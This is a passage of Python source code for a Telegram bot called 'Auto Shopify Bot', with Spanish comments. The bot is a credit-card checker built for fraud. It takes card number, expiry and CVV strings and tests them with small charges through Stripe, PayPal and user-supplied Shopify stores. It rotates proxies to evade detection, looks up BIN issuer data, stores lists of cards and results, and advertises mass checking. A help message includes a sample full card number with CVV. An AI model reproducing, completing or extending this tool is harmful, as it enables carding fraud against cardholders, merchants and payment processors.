        bank_name = bank_info.get('name', 'Unknown')
        
        # Datos adicionales
        source = bin_info.get('source', 'API')
        brand = bin_info.get('brand', '')
        prepaid = "PREPAID" if bin_info.get('prepaid') else "NORMAL"
        product = bin_info.get('product', '')
        
        # Determinar tipo de tarjeta completo
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        # Tipo específico (debit/credit)
        tipo_especifico = card_type.capitalize() if card_type else "UNKNOWN"
        
        # Información de país formateada
        country_line = f"{country_name} {country_emoji}"
        
        # Información adicional del BIN
        bin_info_extra = f"{prepaid} | {source}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
        bin_info_extra = "Fuente: fallback"
    
    # Status del proxy
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    # Formatear tiempo
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    # Limpiar mensaje de estado
    status_msg = resultado_api['message']
    
    # Construir el mensaje premium
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
[ϟ] 𝗜𝗻𝗳𝗼 : {bin_info_extra}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== COMANDOS PRINCIPALES ====================

@bot.message_handler(commands=['start', 'menu'])
def cmd_menu(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Gates disponibles:         ║\n"
        "║  • Stripe: $1.00            ║\n"
        "║  • PayPal: $10/$0.10/$1    ║\n"
        "║  • AutoShopify: variable   ║\n"
        "║                            ║\n"
        "║  Proxies:                   ║\n"
        "║  • /testproxy - Análisis    ║\n"
        "║  • /px - Test rápido        ║\n"
        "║  • /addproxy - Añadir       ║\n"
        "║                            ║\n"
        "║  Sitios Shopify:            ║\n"
        "║  • /addsh URL - Agregar    ║\n"
        "║  • /sitios - Listar        ║\n"
        "║                            ║\n"
        "║  Comandos rápidos:          ║\n"
        "║  /check CC - Stripe $1     ║\n"
        "║  /pp CC - PayPal $10       ║\n"
        "║  /sh CC - AutoShopify      ║\n"
        "║  /mass - Stripe masivo     ║\n"
        "║  /mpp - PayPal masivo      ║\n"
        "║  /msh - Shopify masivo     ║\n"
        "╚════════════════════════════╝\n\n"
        "Selecciona una opción:"
    )
    bot.send_message(message.chat.id, texto, reply_markup=menu_principal())

@bot.message_handler(commands=['help'])
def cmd_help(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║        ❓ AYUDA             ║\n"
        "╠════════════════════════════╣\n"
        "║  • Usa los botones para    ║\n"
        "║    navegar por el menú     ║\n"
        "║                            ║\n"
        "║  • Comandos individuales:  ║\n"
        "║    /check CC - Stripe $1   ║\n"
        "║    /pp CC - PayPal $10     ║\n"
        "║    /pp2 CC - PayPal $0.10  ║\n"
        "║    /pp3 CC - PayPal $1     ║\n"
        "║    /sh CC - AutoShopify    ║\n"
        "║                            ║\n"
        "║  • Comandos masivos:       ║\n"
        "║    /mass - Stripe masivo   ║\n"
        "║    /mpp - PayPal masivo    ║\n"
        "║    /msh - Shopify masivo   ║\n"
        "║                            ║\n"
        "║  • Proxies:                 ║\n"
        "║    /testproxy - Análisis    ║\n"
        "║    /px - Test rápido        ║\n"
        "║    /addproxy - Añadir       ║\n"
        "║    /proxies - Listar        ║\n"
        "║    /delallproxy - Eliminar  ║\n"
        "║                            ║\n"
        "║  • Sitios:                  ║\n"
        "║    /addsh - Añadir sitio   ║\n"
        "║    /sitios - Listar        ║\n"
        "║    /delsh - Eliminar sitio ║\n"
        "║                            ║\n"
        "║  • BIN:                     ║\n"
        "║    /bin BIN - Consultar    ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['addproxy'])
def cmd_add_proxy(message):
    """Añade un proxy"""
    try:
        proxy = message.text.split()[1]
        if guardar_proxy(proxy):
            texto = (
                "╔════════════════════════════╗\n"
                "║     ✅ PROXY GUARDADO      ║\n"
                "╠════════════════════════════╣\n"
                f"║  {proxy[:30]}{'...' if len(proxy)>30 else ''}  ║\n"
                "╚════════════════════════════╝"
            )
        else:
            texto = "❌ Error: El proxy ya existe"
        
        bot.reply_to(message, texto)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addproxy ip:puerto:user:pass")

@bot.message_handler(commands=['proxies'])
def cmd_list_proxies(message):
    """Lista proxies"""
    proxies = obtener_proxies_con_estadisticas()
    
    if not proxies:
        bot.send_message(message.chat.id, "📭 No hay proxies guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🌐 MIS PROXIES       ║\n╠════════════════════════════╣\n"
    
    for proxy, succ, fail, last_test, status in proxies[:10]:
        proxy_short = proxy[:20] + "..." if len(proxy) > 20 else proxy
        
        # Determinar emoji según status
        if status == 'excelente':
            status_emoji = "✅"
        elif status == 'bueno':
            status_emoji = "👍"
        elif status == 'lento':
            status_emoji = "🐢"
        elif status == 'parcial':
            status_emoji = "⚠️"
        elif status == 'muerto':
            status_emoji = "❌"
        else:
            status_emoji = "⏳"
        
        texto += f"║ {status_emoji} {proxy_short:<22} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 Último test: {last_test[-8:] if last_test else 'N/A'} ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto)

@bot.message_handler(commands=['delproxy'])
def cmd_del_proxy(message):
    """Elimina un proxy específico"""
    try:
        proxy = message.text.split()[1]
        if eliminar_proxy(proxy):
            bot.reply_to(message, f"✅ Proxy eliminado: {proxy[:30]}")
        else:
            bot.reply_to(message, "❌ Proxy no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delproxy ip:puerto:user:pass")

@bot.message_handler(commands=['delallproxy'])
def cmd_del_all_proxies(message):
    """Elimina TODOS los proxies"""
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

@bot.message_handler(commands=['addsh'])
def cmd_add_sitio(message):
    """Agrega un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")

@bot.message_handler(commands=['sitios'])
def cmd_listar_sitios(message):
    """Lista todos los sitios Shopify"""
    sitios = obtener_sitios_con_estadisticas()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for url, succ, fail, last_used in sitios[:10]:
        url_short = url[:25] + "..." if len(url) > 25 else url
        total = succ + fail
        tasa = (succ/total*100) if total > 0 else 0
        
        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto)

@bot.message_handler(commands=['delsh'])
def cmd_del_sitio(message):
    """Elimina un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")

@bot.message_handler(commands=['bin'])
def cmd_bin(message):
    """Consultar información de BIN (versión mejorada)"""
    try:
        bin_num = message.text.split()[1][:6]
        
        msg = bot.reply_to(message, f"🔍 Consultando BIN {bin_num}...")
        
        bin_info = consultar_bin(bin_num)
        
        if 'error' in bin_info:
            texto = f"❌ Error: {bin_info['error']}"
        else:
            scheme = bin_info.get('scheme', 'UNKNOWN').upper()
            card_type = bin_info.get('type', 'UNKNOWN').upper()
            country_info = bin_info.get('country', {})
            country_name = country_info.get('name', 'Unknown')
            country_emoji = country_info.get('emoji', '🌍')
            bank_info = bin_info.get('bank', {})
            bank_name = bank_info.get('name', 'Unknown')
            source = bin_info.get('source', 'API')
            brand = bin_info.get('brand', '')
            prepaid = "PREPAID" if bin_info.get('prepaid') else "NORMAL"
            product = bin_info.get('product', '')
            
            texto = f"""
📊 *INFORMACIÓN DEL BIN {bin_num}*

🏦 *Esquema:* {scheme}
💳 *Tipo:* {card_type}
🌍 *País:* {country_name} {country_emoji}
🏛️ *Banco:* {bank_name}
📦 *Producto:* {product if product else 'N/A'}
🔄 *Tipo:* {prepaid}
🔍 *Fuente:* {source}

🔍 *BIN válido*
            """
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id, parse_mode='Markdown')
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /bin 559888")

# ==================== COMANDOS DE VERIFICACIÓN ====================

@bot.message_handler(commands=['check'])
def cmd_check(message):
    """Verificar con Stripe $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_stripe(cc, proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_stripe(cc)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    """Verificar con PayPal $10.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=1, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=1)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(message):
    """Verificar con PayPal $0.10"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=2, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=2)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $0.10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp3'])
def cmd_pp3(message):
    """Verificar con PayPal $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=3, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=3)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $1', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sh'])
def cmd_shopify(message):
    """Verificar con AutoShopify"""
    try:
        partes = message.text.split()
        cc = partes[1]
        
        # Validar formato de tarjeta
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        # Obtener sitios disponibles
        sitios = obtener_sitios()
        
        if not sitios:
            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
            return
        
        # Si se proporciona URL específica
        if len(partes) == 3:
            url = partes[2]
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
                return
        else:
            # Seleccionar sitio aleatorio
            url = random.choice(sitios)
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_autoshopify(cc, url, proxy)
                if not mejor_resultado or resultado['success']:
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_autoshopify(cc, url)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                            mejor_resultado['amount'], mejor_resultado['status'], 
                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            # Actualizar estadísticas del sitio
            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== VERIFICACIÓN MASIVA (RESUMEN) ====================
# Nota: Por razones de espacio, se omiten las funciones masivas (/mass, /mpp, /msh)
# pero puedes copiarlas de tu código anterior

# ==================== MENÚS Y BOTONES ====================

def menu_principal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
    btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
    btn3 = types.InlineKeyboardButton("💵 Stripe $1", callback_data='menu_stripe')
    btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
    btn6 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
    btn7 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

def menu_tarjetas():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Listar tarjetas", callback_data='listar_tarjetas')
    btn2 = types.InlineKeyboardButton("🗑️ Eliminar tarjeta", callback_data='eliminar_tarjeta')
    btn3 = types.InlineKeyboardButton("🧹 Limpiar todas", callback_data='limpiar_tarjetas')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_proxies():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir proxy", callback_data='add_proxy')
    btn2 = types.InlineKeyboardButton("📋 Listar proxies", callback_data='listar_proxies')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar proxy", callback_data='del_proxy')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_proxies')
    btn5 = types.InlineKeyboardButton("🧹 Limpiar muertos", callback_data='clean_dead')
    btn6 = types.InlineKeyboardButton("🔍 Testear proxies", callback_data='test_proxies')
    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

def menu_paypal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 PayPal $10", callback_data='paypal_10')
    btn2 = types.InlineKeyboardButton("🪙 PayPal $0.10", callback_data='paypal_01')
    btn3 = types.InlineKeyboardButton("💎 PayPal $1", callback_data='paypal_1')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_shopify():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir sitio", callback_data='add_sitio')
    btn2 = types.InlineKeyboardButton("📋 Listar sitios", callback_data='listar_sitios')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar sitio", callback_data='del_sitio')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_sitios')
    btn5 = types.InlineKeyboardButton("🔍 Verificar una", callback_data='shopify_individual')
    btn6 = types.InlineKeyboardButton("📦 Verificar masivo", callback_data='shopify_masivo')
    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'volver_principal':
        bot.edit_message_text(
            "Selecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_principal()
        )
    
    elif call.data == 'menu_tarjetas':
        bot.edit_message_text(
            "💳 *GESTIÓN DE TARJETAS*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_tarjetas()
        )
    
    elif call.data == 'menu_proxies':
        bot.edit_message_text(
            "🌐 *GESTIÓN DE PROXIES*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'menu_paypal':
        bot.edit_message_text(
            "💰 *SELECCIONA GATE PAYPAL*\n\nElige el monto:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_paypal()
        )
    
    elif call.data == 'menu_shopify':
        bot.edit_message_text(
            "🛍️ *GESTIÓN DE SITIOS SHOPIFY*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'menu_stats':
        stats = obtener_estadisticas()
        texto = (
            "╔════════════════════════════╗\n"
            "║     📊 ESTADÍSTICAS        ║\n"
            "╠════════════════════════════╣\n"
            f"║ 🌐 PROXIES                 ║\n"
            f"║    📌 {stats['proxies']} guardados        ║\n"
            f"║    ✅ {stats['exits_proxy']} éxitos       ║\n"
            f"║    ❌ {stats['fallos_proxy']} fallos       ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 🛍️ SITIOS                 ║\n"
            f"║    📌 {stats['sitios']} guardados         ║\n"
            f"║    ✅ {stats['exits_sitio']} éxitos        ║\n"
            f"║    ❌ {stats['fallos_sitio']} fallos        ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 💳 TARJETAS                ║\n"
            f"║    📋 {stats['tarjetas']} total          ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 📝 VERIFICACIONES          ║\n"
            f"║    📈 {stats['checks']} totales       ║\n"
            f"║    ✅ {stats['aprobadas']} aprobadas     ║\n"
            "╚════════════════════════════╝"
        )
        bot.send_message(call.message.chat.id, texto, reply_markup=menu_principal())
    
    elif call.data == 'menu_cargar':
        bot.send_message(
            call.message.chat.id,
            "📁 *CARGAR ARCHIVO*\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com\n\nEl bot detectará automáticamente qué es cada cosa.",
            parse_mode='Markdown'
        )
    
    elif call.data == 'listar_tarjetas':
        listar_tarjetas(call.message)
    
    elif call.data == 'listar_proxies':
        cmd_list_proxies(call.message)
    
    elif call.data == 'add_proxy':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR PROXY*\n\nEnvía el proxy en formato:\n`ip:puerto:user:pass`\n\nEjemplo: `193.36.187.170:3128:user:pass`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_proxy)
    
    elif call.data == 'test_proxies':
        cmd_test_proxies_avanzado(call.message)
    
    elif call.data == 'del_all_proxies':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'confirm_del_all_proxies':
        cantidad = eliminar_todos_proxies()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} proxies*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    
    elif call.data == 'cancel_del_all_proxies':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id
        )
    
    elif call.data == 'shopify_individual':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *AUTOSHOPIFY INDIVIDUAL*\n\nUsa: `/sh NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/sh 4128717483067607|07|27|443`\n\nPara sitio específico: `/sh CC URL`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'shopify_masivo':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *VERIFICACIÓN MASIVA SHOPIFY*\n\nUsa: `/msh`\n\nOpciones:\n`/msh --delay 3 --notificar 10`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'add_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR SITIO SHOPIFY*\n\nEnvía la URL del sitio:\n`https://tienda.myshopify.com`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_sitio)
    
    elif call.data == 'listar_sitios':
        cmd_listar_sitios(call.message)
    
    elif call.data == 'del_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR SITIO*\n\nEnvía la URL del sitio a eliminar:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_sitio)

def procesar_add_proxy(message):
    proxy = message.text.strip()
    if guardar_proxy(proxy):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ PROXY GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {proxy[:30]}{'...' if len(proxy)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El proxy ya existe"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_add_sitio(message):
    url = message.text.strip()
    if guardar_sitio(url):
        texto = (
            "╔════════════════════════════╗\n"
            "║     ✅ SITIO GUARDADO      ║\n"
            "╠════════════════════════════╣\n"
            f"║  {url[:30]}{'...' if len(url)>30 else ''}  ║\n"
            "╚════════════════════════════╝"
        )
    else:
        texto = "❌ Error: El sitio ya existe o URL inválida"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

def procesar_del_sitio(message):
    url = message.text.strip()
    if eliminar_sitio(url):
        texto = f"✅ Sitio eliminado: {url[:30]}"
    else:
        texto = "❌ Sitio no encontrado"
    
    bot.reply_to(message, texto, reply_markup=menu_principal())

# ==================== FUNCIONES DE LISTADO ====================

def listar_tarjetas(message):
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.send_message(message.chat.id, "📭 No hay tarjetas guardadas", reply_markup=menu_principal())
        return
    
    texto = "╔════════════════════════════╗\n║     💳 MIS TARJETAS      ║\n╠════════════════════════════╣\n"
    
    for cc, fecha, veces in tarjetas[:10]:
        fecha_corta = fecha[5:16] if fecha else "?"
        cc_short = cc[:10] + "..." + cc[-4:] if len(cc) > 15 else cc
        texto += f"║ 💳 {cc_short:<20} ║\n║    └ {fecha_corta} [{veces} veces] ║\n"
    
    texto += f"╠════════════════════════════╣\n║ 📊 Total: {len(tarjetas)} tarjetas        ║\n╚════════════════════════════╝"
    
    bot.send_message(message.chat.id, texto, reply_markup=menu_tarjetas())

# ==================== ARCHIVOS ====================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Solo acepto archivos .txt")
        return
    
    msg = bot.reply_to(message, "📦 Procesando archivo...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
